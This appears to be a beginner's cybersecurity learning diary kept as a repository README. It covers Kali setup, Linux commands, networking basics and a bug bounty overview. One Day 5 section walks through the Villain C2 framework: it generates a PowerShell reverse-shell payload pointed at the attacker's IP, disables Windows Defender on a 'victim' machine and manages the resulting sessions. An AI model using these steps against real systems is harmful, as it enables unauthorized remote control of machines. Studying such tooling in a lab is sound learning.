# Day1
welcome to my repository 
# Day2
I learned how to download Kali Linux for VirtualBox and use 7-Zip to extract the files. While extracting Kali Linux using 7-Zip, I faced some errors but was able to fix them successfully. I'm eager to keep learning new things.
# Day3
Learned about Linux commands such as:
→ ls (List files and directories)
→ cd (Change directory)
→ pwd (Print current working directory)
→ mkdir (Create a new directory)
→ chmod (Change file permissions), etc.
Also learned how to run and execute them in Kali Linux using VirtualBox.
I'm excited to learn more new things ahead!
# Day4
->NAT (Network Address Translation):
       NAT is a networking process used to modify IP address information in packet headers while they are in transit across        a router or firewall.
       -->It allows multiple devices on a private network to share a single public IP address.
       -->Adds a layer of security by hiding internal IP addresses from external networks.
->Difference between TCP (Transmission Control Protocol) and UDP (User Datagram Protocol):
       1.Connection – TCP is connection-oriented (uses a handshake), while UDP is connectionless and sends data without             establishing a session.
       2. Reliability – TCP ensures reliable data transfer with acknowledgments and retransmissions; UDP does not guarantee        delivery.
       3.Speed – TCP is slower due to error checking and connection management, while UDP is faster because it has minimal         overhead.
       4.Security Risks – TCP can be targeted by attacks like SYN flooding and session hijacking, whereas UDP is vulnerable         to spoofing and amplification attacks.
->IP Address (Internet Protocol Address):
       Each device connected to a network is assigned an IP address to identify it.
        Currently, we are receiving **Dynamic IP Addresses** (assigned automatically and may change).
->IPv4 (Internet Protocol version 4):
        Format: 32-bit (e.g., `192.168.1.1`)
        Supports about 4.3 billion unique addresses.
->MAC Address (Media Access Control Address)
        Each device has a unique MAC address assigned to its network interface card.
        This address rarely changes and is used for communication within a local network.
->Port Forwarding:
        Port forwarding is a networking technique that redirects traffic from an external IP and port to an internal device         on a private network.
         It is useful for remote access to services.
         However, it can be risky if misconfigured, as it may expose internal services to attackers.
# Day5
Creating Reverse shell for Windows Hacking using Villain FrameWork:
-->Villain is a C2 (Command & Control) framework for managing reverse shells and backdoors across multiple machines.
**1. Install Villain**

```bash
git clone https://github.com/t3l3machus/Villain.git
cd Villain
sudo apt update
sudo apt install python3 python3-pip
pip3 install -r requirements.txt
```

**2. Launch Villain**

```bash
cd Villain
sudo python3 Villain.py
```

**3. On Victim Windows Machine**

* Turn off **Windows Defender** → Real-time protection **OFF**.

**4. Generate & Execute Payload**

* In Villain:

  ```bash
  generate payload=windows/reverse_tcp/powershell lhost=<Your_IP> lport=4444
  ```
* Copy payload → Paste into **Windows PowerShell** → Press **Enter**.

**5. Manage Sessions**

* `sessions` → View active sessions.
* `shell <ID>` → Interact with a session.
# Day5

## 🐞 Bug Bounty Basics

Report bugs (especially security flaws) → Get paid and recognized.



###  Common Vulnerabilities

* **BAC**: Accessing things you shouldn't.
* **IDOR**: Changing IDs in URLs to see others’ data.
* **XSS**: Injecting scripts into web pages.
* **CSRF**: Forcing users to take unwanted actions.
* **SQLi**: Messing with database queries.
* **SSRF**: Making the server talk to internal systems.
* **Auth Bypass**: Getting in without real login.


###  Top Bug Bounty Platforms

* **HackerOne** – Big names like Uber, Twitter
* **Bugcrowd** – Lots of public/private programs
* **Intigriti** – EU-based, growing fast
* **YesWeHack** – Strong in Europe
* **Open Bug Bounty** – Free and open


###  Must-Have Tools

* **Burp Suite** – Web app testing
* **Nmap** – Network scanner
* **SQLmap** – Finds SQL injections
* **Dirsearch/Gobuster** – Hidden folders
* **Subfinder/Amass** – Find subdomains
* **Postman/Insomnia** – API testing


###  Zero-Click Attacks

Hack happens with **no clicks** — just receiving a message or file.

 Example:

* **Pegasus Spyware** – Full phone hack via iMessage
* **WhatsApp** – Spyware via missed call
* **Apple Mail** – Attack by just receiving an email


###  Famous Hacking Devices

* **WiFi Pineapple** – Fakes Wi-Fi, steals data
* **USB Rubber Ducky** – Looks like USB, types commands
* **Flipper Zero** – All-in-one wireless hacking tool
* **Bash Bunny** – USB that steals data + more
* **HackRF One** – Radio signal hacking tool


